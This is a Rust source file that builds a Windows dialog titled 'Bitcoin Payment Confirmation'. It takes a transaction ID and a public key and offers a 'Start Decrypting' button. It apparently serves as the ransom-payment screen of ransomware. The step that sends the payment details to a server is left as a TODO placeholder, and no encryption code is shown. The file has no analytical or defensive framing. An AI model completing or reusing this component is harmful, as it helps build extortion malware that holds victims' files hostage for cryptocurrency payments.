use native_windows_gui as nwg;
use native_windows_derive::NwgUi;
use nwg::NativeUi;
use std::cell::RefCell;

#[derive(Default, NwgUi)]
pub struct PaymentWindow {
    #[nwg_control(size: (700, 260), position: (300, 100), title: "Payment Confirmation", flags: "WINDOW|VISIBLE")]
    #[nwg_events(OnWindowClose: [PaymentWindow::close])]
    window: nwg::Window,

    #[nwg_control(text: "Bitcoin Payment Confirmation", position: (20, 10), size: (400, 32), flags: "VISIBLE")]
    title_label: nwg::Label,

    #[nwg_control(text: "Transaction ID:", position: (20, 60), size: (120, 25), flags: "VISIBLE")]
    tx_id_label: nwg::Label,

    #[nwg_control(text: "", position: (150, 60), size: (530, 25), flags: "VISIBLE")]
    tx_id_input: nwg::TextInput,

    #[nwg_control(text: "Public Key:", position: (20, 100), size: (120, 25), flags: "VISIBLE")]
    pub_key_label: nwg::Label,

    #[nwg_control(text: "", position: (150, 100), size: (530, 25), flags: "VISIBLE")]
    pub_key_input: nwg::TextInput,

    #[nwg_control(text: "Start Decrypting", position: (570, 140), size: (110, 25), flags: "VISIBLE")]
    #[nwg_events(OnButtonClick: [PaymentWindow::on_start_decrypt])]
    decrypt_button: nwg::Button,

    #[nwg_control(text: "", position: (20, 180), size: (660, 50), flags: "VISIBLE|VSCROLL|AUTOVSCROLL", readonly: true)]
    status: nwg::TextBox,
}

impl PaymentWindow {
    fn close(&self) {
        nwg::stop_thread_dispatch();
    }

    fn on_start_decrypt(&self) {
        let tx_id = self.tx_id_input.text();
        let pub_key = self.pub_key_input.text();

        if tx_id.is_empty() || pub_key.is_empty() {
            self.status.set_text("Error: Please fill in both fields");
            return;
        }

        self.status.set_text("Sending confirmation to server...");

        // TODO: Send tx_id and pub_key to server
        // You can use tokio::spawn to run async code here
        let tx_id_clone = tx_id.clone();
        let pub_key_clone = pub_key.clone();

        std::thread::spawn(move || {
            // This is where you would send data to the server
            // For now, just a placeholder
            println!("Transaction ID: {}", tx_id_clone);
            println!("Public Key: {}", pub_key_clone);
        });

        self.status.set_text("Confirmation sent! Waiting for server response...");
    }
}

pub fn show_confirmation_window() {
    nwg::init().expect("Failed to init Native Windows GUI");
    
    let _app = PaymentWindow::build_ui(Default::default()).expect("Failed to build UI");

    // Larger title font
    let mut title_font = nwg::Font::default();
    nwg::Font::builder()
        .family("Segoe UI")
        .size(18)
        .weight(800)
        .build(&mut title_font)
        .expect("Failed to build font");
    _app.title_label.set_font(Some(&title_font));
    
    nwg::dispatch_thread_events();
}